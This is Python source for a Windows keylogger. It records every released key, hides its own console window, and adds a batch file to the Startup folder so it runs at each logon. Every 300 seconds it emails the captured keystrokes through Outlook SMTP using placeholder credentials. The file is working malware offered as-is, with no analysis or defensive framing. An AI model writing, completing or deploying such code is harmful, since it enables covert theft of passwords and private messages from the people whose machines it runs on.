from win32 import win32api, win32console, win32gui
import pythoncom, keyboard, smtplib, os, shutil
from threading import Semaphore, Timer


SEND_REPORT_EVERY = 300
EMAIL_ADDRESS = "example@example.com"
EMAIL_PASSWORD = "example"


class Keylogger:
    def __init__(self, interval, error):
        self.error = error
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)
    

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp-mail.outlook.com", port=587)
        server.starttls()
        server.login(email, password)
        subject = f"Subject: Keylogger output\n\n"
        message = message.encode(encoding="ascii", errors="ignore").decode()
        message = subject + message
        if self.error:
            message += f"\nError: {self.error}"
        server.sendmail(from_addr=email, to_addrs=email, msg=message)
        server.quit()
    
    
    def report(self):
        if self.log:
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()
    

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    error = ""
    if open("n_start.txt").read() == "":
        start_up_path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
        with open(f"{start_up_path}\\execute.bat", "w") as exec_bat:
            try:
                exec_bat.write(f"cd {os.getcwd()}\nkeylogger.exe")
                with open("n_start.txt", "w") as n_start:
                    n_start.write("1")
            except PermissionError as e:
                error = e
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, error=error)
    keylogger.start()
